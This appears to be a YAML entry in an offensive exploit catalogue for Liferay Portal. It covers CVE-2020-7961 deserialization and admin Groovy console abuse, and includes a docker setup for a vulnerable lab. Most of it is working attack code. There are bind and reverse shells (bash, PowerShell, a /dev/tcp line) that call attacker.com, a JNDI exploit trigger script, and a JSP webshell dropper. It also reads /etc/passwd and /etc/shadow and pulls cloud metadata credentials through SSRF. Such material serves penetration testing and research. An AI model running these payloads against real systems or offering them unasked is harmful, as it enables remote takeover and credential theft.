---
comment: |
  Liferay Portal is a Java-based enterprise CMS and portal platform.

  CVE-2020-7961 (CVSS 9.8, CISA KEV): Unauthenticated RCE via Java deserialization in the
  `/api/jsonws` endpoint. Liferay's JSON Web Services API deserializes user-supplied data
  without validation when invoking the `DDMDataProviderInstance` service. The `invokerURL`
  parameter is passed to an unmarshaller that performs a JNDI lookup, triggering
  deserialization of attacker-controlled data via the c3p0
  `com.mchange.v2.c3p0.WrapperConnectionPoolDataSource` gadget chain. A successful exploit
  executes arbitrary code as the Liferay process user. Affects Liferay Portal 6.1.0 through
  7.2.1 GA2. Fixed in 7.2.1 CE GA2 and DXP fix packs.
  nuclei: CVE-2020-7961
  ExploitDB: 50/50070

  Admin RCE via Groovy script console: Liferay Portal exposes a server-side scripting
  console at /group/control_panel/manage/-/server/script for server administrators.
  Arbitrary Groovy code executes inside the JVM as the Liferay process user.
docker:
  compose: "services:\n  liferay:\n    image: liferay/portal:7.2.1-ga2\n    ports:\n\
    \      - \"8080:8080\"\n    environment:\n      LIFERAY_SETUP_PERIOD_WIZARD_PERIOD_ENABLED:\
    \ \"false\"\n      LIFERAY_TERMS_PERIOD_OF_PERIOD_USE_PERIOD_REQUIRED: \"false\"\
    \n      LIFERAY_USERS_PERIOD_REMINDER_PERIOD_QUERIES_PERIOD_ENABLED: \"false\"\
    \n"
  note: 'Starts Liferay Portal 7.2.1 GA2 (vulnerable to CVE-2020-7961 unauthenticated

    deserialization RCE). Startup takes approximately 3 minutes.

    Access at `http://localhost:8080`. Default admin credentials: test@liferay.com
    / test.

    The Groovy script console is at:

    /group/control_panel/manage/-/server/script

    after logging in as admin.

    '
functions:
  bind-shell:
  - code: |
      // Groovy script console: bind shell on TCP 12345
      // Submit at: /group/control_panel/manage/-/server/script
      ServerSocket server = new ServerSocket(12345)
      Socket client = server.accept()
      Process p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start()
      InputStream ci = client.getInputStream()
      OutputStream co = client.getOutputStream()
      InputStream pi = p.getInputStream()
      OutputStream po = p.getOutputStream()
      while (!client.isClosed()) {
          while (pi.available() > 0) co.write(pi.read())
          while (ci.available() > 0) po.write(ci.read())
          co.flush()
          po.flush()
          Thread.sleep(50)
      }
      p.destroy()
      server.close()
    comment: |
      Groovy script console opens a TCP bind shell on port 12345 bridged to /bin/sh.
      The HTTP request to the script console hangs while the bind shell is active.
      Connect from the attacker with: nc victim.com 12345
    connector: tcp-client
    contexts:
      admin:
      console:
    platform: linux
    tty: false
  file-read:
  - code: |
      // Groovy script console: read an arbitrary file
      println new File("/etc/passwd").text
    comment: |
      Reads an arbitrary server-side file via the Groovy script console.
      Useful for extracting database credentials from
      /opt/liferay/data/portal-setup-wizard.properties or
      /opt/liferay/tomcat-*/webapps/ROOT/WEB-INF/classes/portal-ext.properties.
    contexts:
      admin:
      console:
  file-write:
  - code: |
      // Groovy script console: write arbitrary content to the filesystem
      new File("/opt/liferay/tomcat-9.0.17/webapps/ROOT/shell.jsp").text = \
          '<%@ page import="java.io.*" %><%String c=request.getParameter("c");if(c!=null){String[] a={"/bin/sh","-c",c};Process p=Runtime.getRuntime().exec(a);out.print(new String(p.getInputStream().readAllBytes()));}%>'
    comment: |
      Writes arbitrary content to the filesystem via the Groovy script console.
      The example drops a JSP webshell into the Liferay Tomcat web root.
      Adjust the path for the exact Tomcat version in use (check /opt/liferay/).
      Access the shell at: http://victim.com:8080/shell.jsp?c=id
    contexts:
      admin:
      console:
  rce:
  - code: |
      # CVE-2020-7961: unauthenticated RCE via JSONWS deserialization
      # Requires: ysoserial (https://github.com/frohoff/ysoserial) and
      #           a JNDI exploit server (e.g., marshalsec or JNDI-Exploit-Kit)
      # 1. Start a JNDI exploit server pointing to a remote class that runs the command:
      #    java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/evil/#Exploit" 1099
      # 2. Send the deserialization trigger:
      python3 - <<'EOF'
      import requests

      TARGET = "http://victim.com:8080"
      JNDI   = "rmi://attacker.com:1099/Exploit"

      # The invokerURL parameter causes Liferay to perform a JNDI lookup
      # which deserializes the response via c3p0 WrapperConnectionPoolDataSource
      r = requests.post(
          TARGET + "/api/jsonws/invoke",
          data={
              "cmd": '{"$invokerURL":"' + JNDI + '"}',
              "/api/jsonws/invoke": "",
          },
      )
      print(r.status_code, r.text[:200])
      EOF
    comment: |
      CVE-2020-7961: Liferay's JSONWS API passes the invokerURL value to a c3p0
      WrapperConnectionPoolDataSource, triggering a JNDI lookup that deserializes
      the remote class. The deserialized payload executes as the Liferay process user.
      Pair with marshalsec or JNDI-Exploit-Kit to serve the malicious class.
      nuclei: CVE-2020-7961
      ExploitDB: 50070
      Metasploit: exploit/multi/misc/liferay_java_deserialization
    contexts:
      unauthenticated:
    version: |
      6.1.0 - 7.2.1 GA2 (before 7.2.1 CE GA2 / DXP fix packs)
  - code: |
      // Groovy script console: execute OS command and return output
      // Submit at: /group/control_panel/manage/-/server/script
      def cmd = ["id"].execute()
      cmd.waitFor()
      println cmd.text
    comment: |
      Liferay Portal's server-side Groovy script console executes arbitrary JVM code
      as the Liferay process user. Access requires the Administrator role.
      Use a List form for commands with arguments:
        ["/bin/sh", "-c", "cat /etc/shadow"].execute()
    contexts:
      admin:
      console:
    platform: linux
  reverse-shell:
  - blind: true
    code: |
      # CVE-2020-7961: reverse shell via JSONWS deserialization (Linux)
      # The JNDI class served by the exploit server executes the reverse shell payload.
      # Serve a compiled Java class via HTTP whose static initialiser runs:
      #   Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",
      #     "bash -i >& /dev/tcp/attacker.com/12345 0>&1"});
      # Then trigger the deserialization:
      python3 - <<'EOF'
      import requests

      TARGET = "http://victim.com:8080"
      JNDI   = "rmi://attacker.com:1099/Exploit"

      requests.post(
          TARGET + "/api/jsonws/invoke",
          data={
              "cmd": '{"$invokerURL":"' + JNDI + '"}',
              "/api/jsonws/invoke": "",
          },
      )
      print("[*] Payload sent - check listener")
      EOF
    comment: |
      CVE-2020-7961: the JNDI-loaded class executes the bash reverse shell in its
      static initialiser. The HTTP response returns before the shell connects.
      nuclei: CVE-2020-7961
    contexts:
      unauthenticated:
    listener: tcp-server
    platform: linux
    tty: false
    version: |
      6.1.0 - 7.2.1 GA2 (before 7.2.1 CE GA2 / DXP fix packs)
  - blind: true
    code: |
      // Groovy script console: reverse bash shell (Linux)
      // Submit at: /group/control_panel/manage/-/server/script
      String host = "attacker.com"
      int port = 12345
      Process p = new ProcessBuilder("/bin/bash").redirectErrorStream(true).start()
      Socket s = new Socket(host, port)
      InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream()
      OutputStream po = p.getOutputStream(), so = s.getOutputStream()
      while (!s.isClosed()) {
          while (pi.available() > 0) so.write(pi.read())
          while (pe.available() > 0) so.write(pe.read())
          while (si.available() > 0) po.write(si.read())
          so.flush()
          po.flush()
          Thread.sleep(50)
      }
      p.destroy()
      s.close()
    comment: |
      Groovy script console bridges a raw TCP socket to a spawned /bin/bash process.
      The script console HTTP request hangs while the shell is active.
      Shell output goes to the attacker's listener, not the HTTP response.
    contexts:
      admin:
      console:
    listener: tcp-server
    platform: linux
    tty: false
  - blind: true
    code: |
      // Groovy script console: PowerShell reverse shell (Windows)
      String host = "attacker.com"
      int port = 12345
      String ps = '$c=New-Object Net.Sockets.TCPClient("' + host + '",' + port + ');' +
          '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};' +
          'while(($i=$s.Read($b,0,$b.Length)) -ne 0){' +
          '$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);' +
          '$r=(iex $d 2>&1|Out-String);' +
          '$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}'
      ["powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Command", ps].execute()
    comment: |
      Windows variant - spawns a PowerShell reverse shell from the Groovy script console.
      The Groovy execute() call is fire-and-forget; check the listener for the connection.
    contexts:
      admin:
      console:
    listener: tcp-server
    platform: windows
    tty: false
  ssrf:
  - code: |
      // Groovy script console: probe internal services via java.net.URL
      println new URL("http://169.254.169.254/latest/meta-data/iam/security-credentials/").text

      // GCP metadata (requires Metadata-Flavor header):
      println new URL("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
          .openConnection().with {
              setRequestProperty("Metadata-Flavor", "Google")
              inputStream.text
          }

      // Probe internal host:
      println new URL("http://10.0.0.1:8080/").text
    comment: |
      The Groovy script console can make outbound HTTP requests via java.net.URL, reaching
      internal services and cloud metadata endpoints unreachable from the attacker.
      The full response body is returned inline in the console output.
    contexts:
      admin:
      console:
  - code: |
      # CVE-2020-7961: SSRF via JNDI lookup triggered by JSONWS deserialization
      # The invokerURL parameter causes Liferay to make an outbound connection to the
      # attacker-specified host:port as part of the JNDI lookup sequence.
      # This can be used to probe internal services (port scan via timing/errors)
      # or to exfiltrate data via DNS lookups.
      python3 - <<'EOF'
      import requests

      TARGET       = "http://victim.com:8080"
      INTERNAL_URL = "rmi://internal-host:1099/probe"

      r = requests.post(
          TARGET + "/api/jsonws/invoke",
          data={
              "cmd": '{"$invokerURL":"' + INTERNAL_URL + '"}',
              "/api/jsonws/invoke": "",
          },
      )
      # Connection refused vs timeout distinguishes open vs closed ports
      print(r.status_code, r.text[:300])
      EOF
    comment: |
      CVE-2020-7961: the invokerURL parameter triggers an outbound JNDI/RMI connection
      from the Liferay host to the specified address. Use to probe internal network
      topology or reach services that are not externally accessible.
      Connection refused vs timeout differentiates open from closed ports.
    contexts:
      unauthenticated:
    version: |
      6.1.0 - 7.2.1 GA2 (before 7.2.1 CE GA2 / DXP fix packs)
  webshell:
  - code: |
      // Groovy script console: write a JSP webshell to the Liferay Tomcat web root
      // Submit at: /group/control_panel/manage/-/server/script
      // Adjust the Tomcat version in the path to match the target (ls /opt/liferay/)
      String shellPath = "/opt/liferay/tomcat-9.0.17/webapps/ROOT/shell.jsp"
      String shellCode = '<%@ page import="java.io.*" %>' +
          '<%String c=request.getParameter("c");if(c!=null){' +
          'String[] a={"/bin/sh","-c",c};Process p=Runtime.getRuntime().exec(a);' +
          'out.print(new String(p.getInputStream().readAllBytes()));' +
          '}%>'
      new File(shellPath).text = shellCode
      println "[*] Webshell written to: " + shellPath
    comment: |
      Writes a JSP webshell to the Liferay Tomcat web root via the Groovy script console.
      The JSP is served directly by Tomcat. Confirm the exact Tomcat version directory
      under /opt/liferay/ before running.
      Access at: http://victim.com:8080/shell.jsp?c=id
    contexts:
      admin:
      console:
